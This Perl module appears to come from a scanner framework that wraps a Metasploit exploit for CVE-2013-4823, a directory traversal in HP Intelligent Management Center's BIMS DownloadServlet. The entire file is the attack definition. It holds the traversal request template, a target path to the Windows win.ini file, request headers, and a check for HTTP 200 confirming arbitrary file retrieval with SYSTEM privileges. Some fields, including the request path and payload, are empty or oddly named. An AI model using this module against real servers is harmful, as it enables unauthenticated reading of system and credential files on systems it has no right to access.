package HP::MSF::HpImcBimsDownloadservletTraversal;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpImcBimsDownloadservletTraversal";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2013-4823",
  "DESCRIPTION" => "

          This module exploits a lack of authentication and a directory traversal in HP

        Intelligent Management, specifically in the DownloadServlet from the BIMS component,

        in order to retrieve arbitrary files with SYSTEM privileges. This module has been

        tested successfully on HP Intelligent Management Center 5.1 E0202 with BIMS 5.1 E0201

        over Windows 2003 SP2.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "hp_imc_bims_downloadservlet_traversal",
  "OSVDB" => 98248,
  "PATH" => "fileName=__FILENAME__&path=/&",
  "PATHS" => ["imc"],
  "THE TITLE OF THE FILE TO DOWNLOAD" => "/windows\\\\win.ini",
  "TITLE" => "HP Intelligent Management BIMS DownloadServlet Directory Traversal",
  VARIABLES => {
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path to HP Intelligent Management Center",
  VALUE => "/imc",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
